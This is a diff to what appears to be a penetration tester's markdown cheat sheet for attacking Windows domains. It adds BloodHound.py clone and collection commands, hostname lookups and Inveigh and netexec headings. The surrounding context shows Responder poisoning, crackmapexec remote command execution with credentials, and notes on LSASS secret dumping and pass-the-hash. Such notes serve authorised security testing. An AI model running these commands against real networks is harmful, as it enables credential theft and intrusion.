@@ -12,6 +12,10 @@
 
 `netdiscover`
 
+`hostname -I`
+
+`hostname -d`
+
 ## Scanning
 
 `nbtscan 192.168.1.1/24`
@@ -51,6 +55,8 @@ Get IP and hostname
 ### DHCP
 `responder -I eth0 -wdF`
 
+## Inveigh
+
 
 # SSH Tunneling
 
@@ -83,6 +89,11 @@ Looks for LSASS secrets, includes tokens and plaintext passwords stored in memor
 
 Bloodhound collector
 
+`git clone https://github.com/dirkjanm/BloodHound.py.git`
+
+`BloodHound.py -u user -p passw -d domain -c all`
+
+
 # crackmapexec
 
 `crackmapexec smb <ip> -u user -p password -x 'whoami'`
@@ -102,6 +113,9 @@ Pass the hash. This attack only works with NTLM hashes, not net hashes.
 * **-X**: powershell command execution
   * Works better with winrm
 * **-d**: domain
+
+# netexec
+
 
 # smbmap
 
